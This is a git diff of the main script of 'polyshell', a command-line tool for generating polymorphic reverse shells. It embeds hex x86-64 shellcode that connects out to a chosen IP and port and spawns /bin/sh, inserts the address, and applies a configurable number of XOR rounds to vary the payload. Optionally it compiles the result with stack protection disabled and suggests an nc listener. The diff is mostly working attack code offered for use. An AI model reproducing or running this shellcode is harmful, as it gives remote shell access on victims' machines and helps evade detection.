@@ -1,9 +1,15 @@
 #!/usr/bin/env python3
-import sys
-import argparse
+
+from sys import argv,stderr
+from argparse import ArgumentParser
 from polyshell import dechex
-from polyshell import ipbloc
-from polyshell import portbloc
+from polyshell import bloc
+from polyshell import build
+
+class argwrap(ArgumentParser):
+    def error(self, message):
+        self.print_help(stderr)
+        self.exit(2, f'\n [!] Error: {message}\n\n')
 
 
 def main():
@@ -13,52 +19,56 @@ def main():
      ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
     ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
     .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 
+
+       Simple polymorphic reverse shell generator.
+
+                Vadimador - Ninuuu - t4yki
+         https://github.com/Vadimador/polyshell
+
     '''
-    baseshell = "4831c04831db4831d24831ff4831f6b02940b70240b601syscall4989c7b02a4c89ff4831f6ip56port666a024889e6b218syscall4831c04831d2b0214c89ff4831f6syscall4831c04831d2b0214c89ff48ffc6syscall4d31ff4d31f64831ff4831f64831c0415749bf2f2f62696e2f736841574889e74156574889e6b03b4831d2syscallb03c4831ffsyscall"
-    print(banner)
-    parser = argparse.ArgumentParser(description='Tool to create polymorphique reverse shell')
-    parser.add_argument('-i', '--ip', dest='ip', help='IPv4 Address')
-    parser.add_argument('-p', '--port', dest='port', help='Port to bind')
-    parser.add_argument('-e', '--endian', dest='endianness', choices=['big', 'little'], help='Endianness of the target', default='little')
+    print(f'{banner}')
+
+    baseshell = "4831c04831db4831d24831ff4831f6b02940b70240b6010f054989c7b02a4c89ff4831f6ip56port666a024889e6b2180f054831c04831d2b0214c89ff4831f60f054831c04831d2b0214c89ff48ffc60f054d31ff4d31f64831ff4831f64831c0415749bf2f2f62696e2f736841574889e74156574889e6b03b4831d20f05b03c4831ff0f05"
+    
+    parser = argwrap(ArgumentParser)
+    parser.add_argument('-i', '--ip', dest='ip', help='IPv4 Address', required=True)
+    parser.add_argument('-p', '--port', dest='port', help='Port to bind', required=True)
+    parser.add_argument('-e', '--endian', dest='endianness', choices=['big', 'little'], help='Endianness of the target, default=little', default='little', required=False)
+    parser.add_argument('-n', '--nbxor', dest='nbxor', help='Number of xor to put, default=10', type=int, default=10, required=False)
+    parser.add_argument('-b', '--build', dest='compile', help="Compile the C file", action='store_true', required=False)
+    
     args = parser.parse_args()
 
-    if len(sys.argv) < 7:
+    if len(argv) < 5:
         parser.print_help()
-        sys.exit(1)
+        exit(1)
 
     iphex = dechex.iphex(args.ip, args.endianness)
-    porthex = dechex.porthex(args.port,args.endianness)
+    porthex = dechex.porthex(args.port, args.endianness)
+    nbxor = args.nbxor
 
-    if iphex:
+    if iphex and porthex:
+        ipbloc = bloc.ip(iphex)
+        portbloc = bloc.port(porthex)
+        build.shellcode(baseshell, ipbloc, portbloc, nbxor)
+        if args.compile:
+            build.compile()
 
-        temp = ipbloc.ipbloc(iphex)
-        baseshell = baseshell.replace("ip",temp)
-
-        temp = portbloc.portbloc(porthex)
-        baseshell = baseshell.replace("port",temp)
-
-        # function randomize : 
-        # function shellcode
-  
-        res = '\\x'.join(baseshell[i:i + 2] for i in range(0, len(baseshell), 2)) 
-        print("ShellCode :\n\\x" + res)
-        print("===============================================")
-
-
-        baseshell = baseshell.replace('syscall','0f05')
-        print("Baseshell without syscall :\n" + baseshell)
-        print("===============================================")
-
-        res = '\\x'.join(baseshell[i:i + 2] for i in range(0, len(baseshell), 2)) 
-        print("ShellCode without syscall :\n\\x" + res)
-
-
-        pass
+        print(f' [!] Shellcode generated!\n')
+        print(f' [+] Number of xor put : {args.nbxor}')
+        print(f' [+] IPv4 address to connect to : {args.ip}')
+        print(f' [+] Port to bind : {args.port}')
+        if args.compile:
+            print(f' [+] Compiled shellcode : reverse_shell')
+            print(f' [+] Start a listener : nc -lvnp {args.port}\n')
+        else:
+            print(f' [+] Shellcode at : reverse_shell.c')
+            print(f' [+] Build : gcc reverse_shell.c -o shell -fno-stack-protector -z execstack -no-pie\n')
     else:
         parser.print_help()
-        sys.exit(1)
+        print('\n [-] Invalid ip address or port value.\n')
+        exit(1)
     
-    #dechex.porthex(args.port, args.endianness)
 
 if __name__ == '__main__':
     main()
